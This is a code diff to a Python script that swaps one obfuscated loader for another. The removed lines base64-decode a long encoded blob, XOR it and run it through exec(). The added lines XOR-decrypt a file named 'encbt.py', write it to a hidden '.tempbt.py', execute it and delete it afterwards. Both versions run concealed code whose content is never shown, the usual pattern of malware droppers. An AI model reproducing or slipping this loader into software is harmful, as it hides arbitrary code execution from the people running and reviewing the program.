@@ -1,6 +1,24 @@
-import base64
+def xor_decrypt_and_execute(encrypted_file, key):
+    with open(encrypted_file, 'rb') as f:
+        encrypted_data = f.read()
 
-KEY = 23
-code = base64.b64decode("Gh1ZGw5ZUhUcH1VWBxFQCBoZQFJQExdERwhQSUNUVgAQEhBJWxBeQ1FESRM+QBpESkFfWhAbEgFbW0tbTBMQThBaU0ZcFEEaQlpRH1EWQ14eU0hTURZIS0MaTgYcVh0dBlwRDB5UDBFYExQMB1RYWlxCCl9KQUFQFwQVDkEWBxpVUwUGRktcU1QdBkJYAF8AUlpRVVlCEBNTB0EWRwRPSFReVQkLUAtDFV0XX0RdQEFZWhYQBlpZQxEHGFFLExsXXxUWQAhYUUVaS1dFWUoHRVVbWVlTXxYATVFaXVFcAFNQV1ZbUw1FAlYIVRZgUwoAWVZSVVZUUQxJXxNFWkZTDBVQFgMVXxNYAEhYWU5aRlZUVw1QV0lGABxPBlhBVFZWDAlFSFVGWgBJVApRWkdGVENcEBRTQUdSRAQdQxVRUVVSTkRXBwAUEVxRU1UbUABHU0pRAQkXTlJcVEwGBktSUlRDUxVVRAgXXxNVQhRRAhBeS1RRWghSSV1UQgEIXgxUSxFHR0xTT1EZXBQUTlJTVU0BGltcWAtCFA5UU1VSCBZVBF5DUQ9XWRcDUAdUU1dUClNDS0FZVx1EWgBSX19RTkxQV0ZQRlNcAANaBlBcXlJcUFBdT0ZRAlpZWg1GTUBFV1BaVkJSUwZBWU9cVUsWRUhGVk0TFVNcA1NVTlFeS1VXBgpVRlVWU1YJTVpcVkxDRkFTRE5WUkEaQxNcG0JRV0ReVQwCW1lUVE5UXQ5bRVdCWgEHWVZXTVVWT0tRVEUBRVYbT1ZTTBZQVkZcRVRaUkZPWhxMFlxWUEEEXBQRTl9eVgEKVF5eQVRQWVVOUU4JRAFSUABeVkFUWgxTW0FcRAoLVV1RVQwAV0JeVEwMAwVUVQ==")
-decoded = ''.join([chr(b ^ KEY) for b in code])
-exec(decoded)
+    decrypted_data = bytearray([byte ^ key for byte in encrypted_data])
+
+
+    temp_file = ".tempbt.py"
+    with open(temp_file, 'wb') as f:
+        f.write(decrypted_data)
+
+
+    import subprocess
+    subprocess.run(["python", temp_file])
+
+
+    import os
+    os.remove(temp_file)
+
+if __name__ == "__main__":
+    encrypted_file = "encbt.py"
+    key = 123
+
+    xor_decrypt_and_execute(encrypted_file, key)
